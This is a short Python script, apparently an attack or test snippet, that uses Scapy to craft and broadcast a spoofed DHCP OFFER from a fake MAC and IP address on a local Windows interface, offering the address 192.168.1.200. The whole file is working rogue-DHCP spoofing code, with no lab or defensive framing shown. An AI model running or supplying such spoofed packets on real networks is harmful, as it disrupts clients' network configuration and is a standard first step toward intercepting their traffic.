from scapy.all import *

iface = '\\Device\\NPF_{1E514016-1566-4FDE-888C-281DC2F2883F}'

fake_offer = (Ether(src='aa:bb:cc:dd:ee:ff', dst='ff:ff:ff:ff:ff:ff') /
              IP(src='192.168.1.99', dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op=2, yiaddr='192.168.1.200') /
              DHCP(options=[('message-type', 'offer'), 'end']))

sendp(fake_offer, iface=iface)
print("Sent fake DHCP offer")